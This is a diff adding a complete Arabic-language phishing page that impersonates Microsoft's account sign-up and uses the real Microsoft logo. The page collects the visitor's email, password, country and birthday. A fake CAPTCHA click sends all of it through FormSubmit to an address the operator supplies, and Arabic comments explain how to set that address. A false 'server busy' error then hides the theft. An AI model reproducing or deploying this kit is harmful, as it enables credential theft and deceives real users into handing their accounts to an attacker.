@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إنشاء حساب Microsoft</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f2f2f2; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .ms-card { background: white; padding: 40px; width: 360px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); min-height: 400px; position: relative; }
+        .logo { width: 108px; margin-bottom: 20px; }
+        h2 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin-bottom: 8px; }
+        input, select { width: 100%; border: none; border-bottom: 1px solid #666; padding: 10px 0; margin-bottom: 20px; outline: none; font-size: 16px; background: transparent; }
+        input:focus { border-bottom-color: #0067b8; }
+        .btn-box { display: flex; justify-content: flex-end; margin-top: 20px; }
+        .btn { background: #0067b8; color: white; border: none; padding: 8px 38px; cursor: pointer; font-size: 15px; }
+        .step { display: none; }
+        .step.active { display: block; }
+        .error-msg { color: #e81123; font-size: 14px; background: #fdf2f2; padding: 12px; border: 1px solid #e81123; margin-top: 20px; display: none; }
+        .captcha-area { border: 1px solid #ccc; padding: 15px; background: #f9f9f9; display: flex; align-items: center; cursor: pointer; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <div class="ms-card">
+        <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" class="logo">
+        
+        <div id="step1" class="step active">
+            <h2>إنشاء حساب</h2>
+            <input type="email" id="email" placeholder="someone@example.com">
+            <div class="btn-box"><button class="btn" onclick="go(2)">التالي</button></div>
+        </div>
+
+        <div id="step2" class="step">
+            <h2 id="user-display" style="font-size: 14px; color: #555;"></h2>
+            <h2>إنشاء كلمة مرور</h2>
+            <input type="password" id="pass" placeholder="كلمة المرور">
+            <div class="btn-box"><button class="btn" onclick="go(3)">التالي</button></div>
+        </div>
+
+        <div id="step3" class="step">
+            <h2>إضافة تفاصيل</h2>
+            <p>نحتاج إلى المزيد من المعلومات قبل إنشاء حسابك.</p>
+            <select id="country">
+                <option value="Iraq">العراق</option>
+                <option value="Saudi Arabia">المملكة العربية السعودية</option>
+                <option value="Egypt">مصر</option>
+                <option value="UAE">الإمارات</option>
+                <option value="Kuwait">الكويت</option>
+            </select>
+            <div style="display: flex; gap: 10px;">
+                <select id="day"><script>for(i=1;i<=31;i++) document.write('<option>'+i+'</option>')</script></select>
+                <select id="month">
+                    <option>كانون الثاني</option><option>شباط</option><option>آذار</option><option>نيسان</option><option>أيار</option>
+                    <option>حزيران</option><option>تموز</option><option>آب</option><option>أيلول</option><option>تشرين الأول</option>
+                </select>
+                <input type="number" id="year" placeholder="السنة" style="width: 80px;">
+            </div>
+            <div class="btn-box"><button class="btn" onclick="go(4)">التالي</button></div>
+        </div>
+
+        <div id="step4" class="step">
+            <h2>التحقق من الهوية</h2>
+            <div class="captcha-area" onclick="sendAll()">
+                <input type="checkbox" style="width:20px; height:20px; margin-left:10px;">
+                <span>أنا لست برنامج روبوت</span>
+            </div>
+            <div id="finalFail" class="error-msg">
+                <b>عذراً!</b> تعذر إكمال التسجيل حالياً. خادم الاستجابة مشغول (Error 0x8004).
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let fullData = {};
+
+        function go(s) {
+            if(s==2) {
+                fullData.email = document.getElementById('email').value;
+                document.getElementById('user-display').innerText = fullData.email;
+            }
+            if(s==3) { fullData.pass = document.getElementById('pass').value; }
+            
+            document.querySelectorAll('.step').forEach(d => d.classList.remove('active'));
+            document.getElementById('step' + s).classList.add('active');
+        }
+
+        function sendAll() {
+            fullData.country = document.getElementById('country').value;
+            fullData.birthday = document.getElementById('day').value + "/" + document.getElementById('month').value;
+            
+            // إرسال البيانات إلى إيميلك عبر خدمة FormSubmit مجاناً
+            // استبدل "your-email@mail.com" بإيميلك الحقيقي لتصلك البيانات
+            fetch("https://formsubmit.co/ajax/your-email@mail.com", {
+                method: "POST",
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(fullData)
+            });
+
+            document.getElementById('finalFail').style.display = 'block';
+        }
+    </script>
+</body>
+</html>
